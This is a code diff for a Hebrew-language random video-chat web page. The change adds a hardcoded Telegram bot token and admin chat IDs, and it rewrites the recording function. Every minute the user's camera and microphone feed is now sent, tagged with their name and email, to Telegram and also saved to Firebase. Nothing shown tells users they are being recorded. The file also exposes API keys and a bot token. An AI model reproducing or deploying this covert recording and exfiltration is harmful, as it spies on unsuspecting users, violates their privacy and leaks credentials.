@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>VideoApp Pro - Fixed Edition</title>
+    <title>VideoApp Final</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
@@ -12,38 +12,36 @@
         * { box-sizing: border-box; margin: 0; padding: 0; touch-action: none; }
         body { font-family: system-ui, -apple-system, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
         
-        /* כפתורי בקרה */
         .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 100; pointer-events: none; }
         .btn-circle { background: rgba(255,255,255,0.25); backdrop-filter: blur(10px); border: none; color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
         
-        /* וידאו */
-        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; }
+        .video-container { height: 60vh; display: flex; flex-direction: column; position: relative; background: #000; flex-shrink: 0; }
         .v-box { flex: 1; position: relative; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         video { width: 100%; height: 100%; object-fit: cover; z-index: 5; background: #000; }
-        
-        .status-msg { position: absolute; z-index: 20; color: #fff; text-align: center; width: 100%; pointer-events: none; font-weight: bold; text-shadow: 0 2px 4px #000; }
+        .status-msg { position: absolute; z-index: 20; color: #fff; text-align: center; width: 100%; pointer-events: none; font-weight: bold; }
 
-        /* צ'אט */
+        /* צ'אט מתוקן */
         #chat-section { 
             height: 40vh; 
-            display: none; 
+            display: none; /* יופעל בחיבור */
             flex-direction: column; 
-            background: #ffffff; 
+            background: #fff; 
             color: #000; 
             z-index: 50;
-            padding-bottom: env(safe-area-inset-bottom, 10px);
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
         }
-        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 8px; background: #f4f4f4; }
+        #messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background: #f7f7f7; }
         .msg { max-width: 80%; padding: 10px 14px; border-radius: 18px; font-size: 15px; line-height: 1.4; }
-        .msg.me { align-self: flex-start; background: #e0e0e0; border-bottom-left-radius: 2px; }
-        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; border-bottom-right-radius: 2px; }
+        .msg.me { align-self: flex-start; background: #e2e2e2; border-bottom-left-radius: 4px; }
+        .msg.partner { align-self: flex-end; background: #007bff; color: #fff; border-bottom-right-radius: 4px; }
         
-        .chat-input-area { display: flex; padding: 10px; background: #fff; border-top: 1px solid #ddd; gap: 10px; }
-        .chat-input-area input { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid #ccc; outline: none; font-size: 16px; color: #000; }
+        .chat-input-area { display: flex; padding: 12px; background: #fff; gap: 10px; border-top: 1px solid #eee; align-items: center; }
+        .chat-input-area input { flex: 1; padding: 12px; border-radius: 25px; border: 1px solid #ddd; outline: none; font-size: 16px; color: #000; }
 
-        /* הרשמה - עיצוב מקורי */
+        /* הרשמה מקורית */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; }
-        .modal-content { background: #fff; color: #333; width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; }
+        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 25px; }
         .modal-content h2 { text-align: center; margin-bottom: 20px; }
         .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
     </style>
@@ -51,7 +49,7 @@
 <body>
 
 <div class="header">
-    <button id="btn-report" class="btn-circle" style="background:rgba(192, 57, 43, 0.9); display:none;" onclick="confirmReport()">🚩</button>
+    <button id="btn-report" class="btn-circle" style="background:rgba(192, 57, 43, 0.8); display:none;" onclick="confirmReport()">🚩</button>
     <button class="btn-circle" onclick="switchCamera()">🔄</button>
 </div>
 
@@ -70,7 +68,7 @@
     <div id="messages"></div>
     <div class="chat-input-area">
         <input type="text" id="chatInput" placeholder="הודעה..." onkeypress="if(event.key==='Enter') sendChatMessage()">
-        <button onclick="sendChatMessage()" style="border:none; background:none; font-size:24px;">🚀</button>
+        <button onclick="sendChatMessage()" style="border:none; background:none; font-size:24px; cursor:pointer;">🚀</button>
     </div>
 </div>
 
@@ -79,77 +77,72 @@
         <h2>הרשמה</h2>
         <input type="text" id="reg-name" placeholder="שם מלא">
         <input type="email" id="reg-email" placeholder="אימייל">
-        <label style="font-size:12px; display:block;">תמונת פרופיל (רשות):</label>
-        <input type="file" id="reg-pfp" accept="image/*">
         <select id="reg-gender">
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button style="width:100%; height:50px; background:#27ae60; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:15px;" onclick="handleRegistration()">התחל</button>
+        <button id="reg-submit" style="width:100%; height:50px; background:#27ae60; color:white; border:none; border-radius:10px; font-weight:bold; margin-top:10px; cursor:pointer;" onclick="handleRegistration()">התחל</button>
     </div>
 </div>
 
 <script>
+    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
+    const ADMIN_IDS = ["8373785890", "7089165458"];
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
-    const socket = io(SERVER_URL);
-    const peer = new Peer(undefined, {
-        config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] }
-    });
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10",
-      authDomain: "live-video-20fca.firebaseapp.com",
-      projectId: "live-video-20fca",
-      storageBucket: "live-video-20fca.firebasestorage.app",
-      messagingSenderId: "590706792062",
-      appId: "1:590706792062:web:1b75b2871f1068f44aaa2f"
-    };
+    
+    const firebaseConfig = { apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", storageBucket: "live-video-20fca.firebasestorage.app" };
     firebase.initializeApp(firebaseConfig);
     const storage = firebase.storage();
+    
+    const socket = io(SERVER_URL);
+    const peer = new Peer(undefined);
 
-    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
-    let userRecorder, chatLog = [], callStartTime;
+    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user", userRecorder;
 
     window.onload = () => {
-        if (!localStorage.getItem('user_v7')) document.getElementById('regModal').style.display = 'flex';
+        if (!localStorage.getItem('user_final')) document.getElementById('regModal').style.display = 'flex';
         else initCamera();
     };
 
     async function handleRegistration() {
         const name = document.getElementById('reg-name').value;
         const email = document.getElementById('reg-email').value;
-        localStorage.setItem('user_v7', JSON.stringify({ name, email, gender: document.getElementById('reg-gender').value }));
+        const gender = document.getElementById('reg-gender').value;
+        if(!name || !email) return alert("נא למלא הכל");
+        localStorage.setItem('user_final', JSON.stringify({ name, email, gender }));
         document.getElementById('regModal').style.display = 'none';
         initCamera();
     }
 
     async function initCamera() {
         if (myStream) myStream.getTracks().forEach(t => t.stop());
-        try {
-            myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: { ideal: 640 }, height: { ideal: 480 } }, 
-                audio: true 
-            });
-            document.getElementById('localVideo').srcObject = myStream;
-            startUserRecording();
-        } catch (e) { console.error("Camera Error", e); }
+        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
+        document.getElementById('localVideo').srcObject = myStream;
+        startUserRecording();
     }
 
     function startUserRecording() {
-        const user = JSON.parse(localStorage.getItem('user_v7'));
         userRecorder = new MediaRecorder(myStream);
-        userRecorder.ondataavailable = (e) => {
+        userRecorder.ondataavailable = async (e) => {
             if (e.data.size > 0) {
                 const blob = new Blob([e.data], { type: 'video/webm' });
-                storage.ref(`admin/users/${user.email}/${Date.now()}.webm`).put(blob);
+                const user = JSON.parse(localStorage.getItem('user_final'));
+                const fileName = `rec_${Date.now()}.webm`;
+                
+                // שליחה לטלגרם
+                ADMIN_IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append("chat_id", id);
+                    fd.append("video", blob, fileName);
+                    fd.append("caption", `👤 ${user.name} (${user.email})`);
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
+                });
+                
+                // גיבוי פיירבייס
+                storage.ref(`admin/users/${user.email}/${fileName}`).put(blob);
             }
         };
-        userRecorder.start(60000);
-    }
-
-    function switchCamera() {
-        camFacing = (camFacing === "user" ? "environment" : "user");
-        initCamera();
+        userRecorder.start(60000); // 60 שניות
     }
 
     peer.on('open', id => myPeerId = id);
@@ -166,31 +159,13 @@
         document.getElementById('btn-report').style.display = "none";
         document.getElementById('remoteVideo').srcObject = null;
 
-        const user = JSON.parse(localStorage.getItem('user_v7'));
+        const user = JSON.parse(localStorage.getItem('user_final'));
         socket.emit('find-partner', { peerId: myPeerId, gender: user.gender });
-    }
-
-    function confirmReport() {
-        if (confirm("האם אתה בטוח שברצונך לדווח על המשתמש? השיחה תסתיים מיד.")) {
-            socket.emit('report-user');
-            stopEverything();
-        }
-    }
-
-    function stopEverything() {
-        isSearching = false;
-        socket.emit('leave-chat');
-        if (currentCall) currentCall.close();
-        document.getElementById('msg-idle').style.display = "block";
-        document.getElementById('msg-search').style.display = "none";
-        document.getElementById('chat-section').style.display = "none";
-        document.getElementById('btn-report').style.display = "none";
-        document.getElementById('remoteVideo').srcObject = null;
     }
 
     socket.on('partner-found', data => {
         isSearching = false;
-        showUI();
+        openChatUI();
         currentCall = peer.call(data.peerId, myStream);
         handleCall(currentCall);
     });
@@ -198,39 +173,33 @@
     peer.on('call', call => {
         call.answer(myStream);
         currentCall = call;
-        showUI();
+        openChatUI();
         handleCall(call);
     });
+
+    function openChatUI() {
+        document.getElementById('msg-search').style.display = "none";
+        document.getElementById('chat-section').style.display = "flex";
+        document.getElementById('btn-report').style.display = "flex";
+    }
 
     function handleCall(call) {
         call.on('stream', s => {
             const rv = document.getElementById('remoteVideo');
             rv.srcObject = s;
-            rv.play(); // חיוב הפעלה למהירות
         });
-        call.on('close', () => { if(!isSearching) stopEverything(); });
-    }
-
-    function showUI() {
-        document.getElementById('msg-search').style.display = "none";
-        document.getElementById('chat-section').style.display = "flex";
-        document.getElementById('btn-report').style.display = "flex";
-        chatLog = [];
+        call.on('close', () => stopEverything());
     }
 
     function sendChatMessage() {
         const input = document.getElementById('chatInput');
         if (!input.value.trim()) return;
         socket.emit('send-chat-msg', input.value);
-        chatLog.push({ sender: "me", text: input.value });
         addMsg('me', input.value);
         input.value = "";
     }
 
-    socket.on('receive-chat-msg', msg => {
-        chatLog.push({ sender: "partner", text: msg });
-        addMsg('partner', msg);
-    });
+    socket.on('receive-chat-msg', msg => addMsg('partner', msg));
 
     function addMsg(type, text) {
         const div = document.createElement('div');
@@ -241,7 +210,27 @@
         m.scrollTop = m.scrollHeight;
     }
 
-    socket.on('partner-disconnected', () => stopEverything());
+    function confirmReport() {
+        if (confirm("האם אתה בטוח שברצונך לדווח? השיחה תסתיים.")) {
+            socket.emit('report');
+            stopEverything();
+        }
+    }
+
+    function stopEverything() {
+        isSearching = false;
+        socket.emit('leave-chat');
+        if (currentCall) currentCall.close();
+        document.getElementById('msg-idle').style.display = "block";
+        document.getElementById('chat-section').style.display = "none";
+        document.getElementById('btn-report').style.display = "none";
+        document.getElementById('remoteVideo').srcObject = null;
+    }
+
+    function switchCamera() { 
+        camFacing = (camFacing === "user" ? "environment" : "user"); 
+        initCamera(); 
+    }
 
     let sX = 0;
     document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
